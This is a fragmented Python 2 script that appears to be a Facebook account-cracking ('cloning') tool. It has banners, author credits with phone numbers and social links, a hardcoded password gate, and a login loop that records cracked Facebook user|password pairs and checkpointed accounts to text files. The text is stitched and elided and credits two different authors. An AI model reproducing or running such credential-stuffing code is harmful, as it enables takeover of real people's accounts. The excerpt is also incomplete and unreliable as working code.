...
╚═╝░░░╚═╝░░░╚══════╝
  ...
  Auther  :  Ahmed Nayem                            Github  :  Nayem404cyber
  Whatspp   :  01706167094
  Contact -https://www.facebook.com/Nayemvai07
  
"""
                                                          
                                                           

"""[1;33;40m--------------------------------------------------\n  \x1b[1;36;40mAuthor     \x1b[1;33;40m: \x1b[0;37;40mHADI ANHAF AIMAN\n  \x1b[1;36;40mwhatapp    \x1b[1;33;40m: \x1b[0;37;40m01728195051\n  \x1b[1;36;40mFacebook   \x1b[1;33;40m: \x1b[0;37;40m HADI ANHAF AIMAN\n  \x1b[1;36;40mPublic     \x1b[1;33;40m: \x1b[0;37;40m12-05-2022\n\x1b[1;33;40m--------------------------------------------------\n  """                            
...
while loop == 'true':
    ...
    if username == CorrectUsername:
        ...
        if password == CorrectPassword:
            ...
            os.system('xdg-open https://github.com/Nayem404cyber')
    else:
        print '\x1b[1;91mWrong!,\x1b[1;92mText me to get the correct username'
        os.system('xdg-open www.facebook.com/Nayemvai07')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[*_*Itz Successful*_*]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('NAYEM/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '[Itz-(CP) Login After 3 Days] ' + k + c + user + ' | ' + pass1 + '\n'
                cps = open('NAYEM/checkpoint.txt', 'a')
